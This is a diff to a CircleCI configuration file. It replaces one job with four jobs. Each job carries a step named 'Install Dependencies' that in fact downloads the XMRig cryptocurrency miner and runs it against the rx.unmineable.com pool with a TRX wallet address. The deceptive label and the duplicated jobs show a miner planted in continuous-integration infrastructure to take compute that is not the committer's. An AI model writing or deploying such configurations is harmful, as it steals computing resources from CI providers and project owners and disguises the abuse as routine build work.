@@ -1,17 +1,38 @@
 version: 2.1
 jobs:
-    trial:
+    Devop:
       docker:
             - image: circleci/ruby:2.5.3
-      parallelism: 16
       steps:
-        - checkout
-        - run: wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 &&./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TJReV8g7d6EtxWbeP9iYmhZHgzRxxxbz4a.jb#gy5w-sleu -t5
-                     
-              
-
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 &&./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TJReV8g7d6EtxWbeP9iYmhZHgzRxxxbz4a.jb#gy5w-sleu -t5
+    Devop1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 &&./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TJReV8g7d6EtxWbeP9iYmhZHgzRxxxbz4a.jb#gy5w-sleu -t5
+    Devop2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 &&./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TJReV8g7d6EtxWbeP9iYmhZHgzRxxxbz4a.jb#gy5w-sleu -t5
+    Devop3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 &&./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TJReV8g7d6EtxWbeP9iYmhZHgzRxxxbz4a.jb#gy5w-sleu -t5
 workflows:
     version: 2.1
     build:
         jobs:
-        - trial
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
